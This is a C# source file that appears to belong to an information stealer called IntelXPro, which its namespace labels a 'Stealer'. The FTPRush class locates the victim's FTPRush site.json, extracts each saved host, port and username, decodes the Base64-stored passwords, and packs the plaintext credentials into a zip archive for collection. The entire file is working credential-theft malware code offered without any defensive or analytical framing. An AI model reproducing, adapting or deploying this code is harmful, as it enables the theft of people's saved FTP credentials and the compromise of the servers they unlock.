using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class FTPRush : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = "C:\\Users\\" + Environment.UserName + "\\Documents\\FTPRush\\site.json";
            if (!File.Exists(text))
            {
                return;
            }
            string input = File.ReadAllText(text);
            Regex regex = new Regex("\"Server\"\\s*:\\s*\\{(.*?)\\}", RegexOptions.IgnoreCase | RegexOptions.Singleline);
            Regex regex2 = new Regex("\"Host\"\\s*:\\s*\"(?<host>[^\"]*)\"", RegexOptions.IgnoreCase);
            Regex regex3 = new Regex("\"Port\"\\s*:\\s*(?<port>\\d+)", RegexOptions.IgnoreCase);
            Regex regex4 = new Regex("\"Username\"\\s*:\\s*\"(?<user>[^\"]*)\"", RegexOptions.IgnoreCase);
            Regex regex5 = new Regex("\"Base64Password\"\\s*:\\s*\"(?<b64>[^\"]*)\"", RegexOptions.IgnoreCase);
            List<string> list = new List<string>();
            Counter.CounterApplications counterApplications = new Counter.CounterApplications
            {
                Name = "FTPRush"
            };
            foreach (Match item in regex.Matches(input))
            {
                string value = item.Groups[1].Value;
                Match match = regex2.Match(value);
                if (!match.Success)
                {
                    continue;
                }
                string value2 = match.Groups["host"].Value;
                Match match2 = regex3.Match(value);
                string text2 = (match2.Success ? match2.Groups["port"].Value : "21");
                Match match3 = regex4.Match(value);
                string text3 = (match3.Success ? match3.Groups["user"].Value : "");
                Match match4 = regex5.Match(value);
                string text4 = "";
                if (match4.Success && !string.IsNullOrEmpty(match4.Groups["b64"].Value))
                {
                    try
                    {
                        byte[] bytes = Convert.FromBase64String(match4.Groups["b64"].Value);
                        text4 = Encoding.UTF8.GetString(bytes);
                    }
                    catch
                    {
                        text4 = "";
                    }
                }
                list.Add("Url: " + value2 + ":" + text2 + "\nUsername: " + text3 + "\nPassword: " + text4 + "\n");
                counterApplications.Files.Add(text + " => FTPRush\\Hosts.txt");
            }
            if (list.Count > 0)
            {
                string text5 = "FTPRush\\Hosts.txt";
                zip.AddFile(text5, Encoding.UTF8.GetBytes(string.Join("\n", list)));
                counterApplications.Files.Add(text5);
                counter.Applications.Add(counterApplications);
            }
        }
    }
}
